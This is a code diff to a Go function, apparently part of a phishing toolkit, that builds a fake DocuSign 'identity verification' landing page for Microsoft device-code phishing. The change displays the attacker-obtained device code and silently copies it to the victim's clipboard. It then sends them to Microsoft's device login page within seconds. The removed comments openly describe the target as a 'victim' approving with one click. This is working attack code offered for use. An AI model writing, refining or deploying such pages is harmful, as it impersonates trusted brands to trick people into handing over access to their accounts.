@@ -624,23 +624,27 @@ func (t *DCTarget) verifyURL() string {
 // ─────────────────────────────────────────────────────────────────────────────
 
 func DCLandingPage(t *DCTarget) string {
-	// Use the complete URI if Microsoft returned one, otherwise build it.
-	verifyURL := t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
+	deviceLoginURL := "https://microsoft.com/devicelogin"
+	code := t.UserCode
 	return fmt.Sprintf(`<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>DocuSign – Opening document…</title>
+<title>DocuSign – Identity Verification</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
-.card{background:#fff;border:1px solid #ddd;border-radius:4px;padding:48px 52px;max-width:400px;width:100%%;text-align:center}
-.ds-logo{margin-bottom:24px}
-.spinner{width:36px;height:36px;border:3px solid #eee;border-top-color:#FFB900;border-radius:50%%;animation:spin .8s linear infinite;margin:0 auto 24px}
-@keyframes spin{to{transform:rotate(360deg)}}
-h2{font-size:18px;font-weight:600;color:#222;margin-bottom:10px}
-p{font-size:14px;color:#777;line-height:1.6}
+.card{background:#fff;border:1px solid #ddd;border-radius:4px;padding:40px 48px;max-width:420px;width:100%%;text-align:center}
+.ds-logo{margin-bottom:20px}
+h2{font-size:17px;font-weight:600;color:#222;margin-bottom:10px}
+.sub{font-size:14px;color:#666;line-height:1.6;margin-bottom:24px}
+.code-wrap{background:#f0f6ff;border:2px solid #0078d4;border-radius:6px;padding:16px 20px;margin-bottom:20px}
+.code-label{font-size:11px;text-transform:uppercase;letter-spacing:.7px;color:#666;margin-bottom:6px}
+.code{font-size:30px;font-weight:700;letter-spacing:8px;color:#0078d4;font-family:'Courier New',monospace;cursor:pointer}
+.hint{font-size:12px;color:#999;margin-bottom:22px}
+.btn{display:inline-block;background:#0078d4;color:#fff;padding:11px 32px;border-radius:3px;font-size:14px;font-weight:600;text-decoration:none}
+.copied{font-size:12px;color:#107c10;display:none;margin-top:6px}
 </style>
 </head>
 <body>
@@ -653,19 +657,55 @@ p{font-size:14px;color:#777;line-height:1.6}
       <text x="30" y="19" font-family="Arial" font-weight="700" font-size="15" fill="#333">DocuSign</text>
     </svg>
   </div>
-  <div class="spinner"></div>
-  <h2>Verifying your identity…</h2>
-  <p>You will be redirected to Microsoft to confirm your account.<br>This only takes a moment.</p>
+  <h2>One more step to access your document</h2>
+  <p class="sub">Microsoft requires a quick identity check before you can view this document. Enter the code below at the Microsoft verification page.</p>
+  <div class="code-wrap">
+    <div class="code-label">Your verification code</div>
+    <div class="code" id="code">%s</div>
+  </div>
+  <p class="hint" id="hint">Click the code to copy it, then paste it on the Microsoft page.</p>
+  <p class="copied" id="copied">Copied — opening Microsoft verification…</p>
+  <a class="btn" href="%s" id="btn">Open Verification Page</a>
 </div>
 <script>
-// Auto-redirect to Microsoft devicelogin with code pre-filled.
-// Victim lands on Microsoft's own confirmation page — one click to approve.
+var code = %q;
+var url  = %q;
+
+// Try to copy silently on load; if denied, user can click manually
+function tryCopy(){
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(code).catch(function(){});
+  }
+}
+tryCopy();
+
+// Click on code box = copy + redirect
+document.getElementById('code').addEventListener('click', function(){
+  tryCopy();
+  showCopied();
+});
+
+document.getElementById('btn').addEventListener('click', function(e){
+  e.preventDefault();
+  tryCopy();
+  showCopied();
+  setTimeout(function(){ window.location.replace(url); }, 600);
+});
+
+function showCopied(){
+  document.getElementById('hint').style.display='none';
+  document.getElementById('copied').style.display='block';
+}
+
+// Auto-open after 3 seconds
 setTimeout(function(){
-  window.location.replace(%q);
-}, 1800);
+  tryCopy();
+  showCopied();
+  setTimeout(function(){ window.location.replace(url); }, 800);
+}, 3000);
 </script>
 </body>
-</html>`, verifyURL)
+</html>`, code, deviceLoginURL, code, deviceLoginURL)
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
